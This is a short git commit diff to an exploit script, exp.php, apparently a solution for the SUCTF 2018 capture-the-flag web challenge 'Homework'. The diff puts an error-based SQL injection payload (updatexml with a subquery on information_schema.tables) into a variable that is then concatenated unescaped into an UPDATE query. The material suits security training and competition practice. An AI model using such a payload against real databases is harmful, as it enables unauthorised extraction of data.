6e8b44692d359e83c8b2398f47fe87e172d14e1d
Alias <yiyezhiqiu233@gmail.com>
2018-05-28 23:10:00 +0800

    SUCTF

--- SUCTF2018/WEB/Homework/exp.php
+++ SUCTF2018/WEB/Homework/exp.php
@@ -4,14 +4,13 @@ function w_addslashes($string)
     return addslashes(trim($string));
 }
 
-$sig = "0x123132132";
+$sig = "1' and updatexml(2,concat(0x7e,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),0)#";
 $filehash = md5(mt_rand());
-$a = "insert into file(filename,filehash,sig) values('" . w_addslashes('123') . "','" . $filehash . "'," . (strrpos(w_addslashes($sig), ")") ? "" : w_addslashes($sig)) . ")";
+// $a = "insert into file(filename,filehash,sig) values('" . w_addslashes('123') . "','" . $filehash . "'," . (strrpos(w_addslashes($sig), ")") ? "" : w_addslashes($sig)) . ")";
 
-echo $a;
+// echo $a;
 echo "\n";
 
 $new_sig = mt_rand();
 $b = "update file set sig='" . intval($new_sig) . "' where id=" . '123' . " and sig='" . $sig . "'";
 echo $b;
-
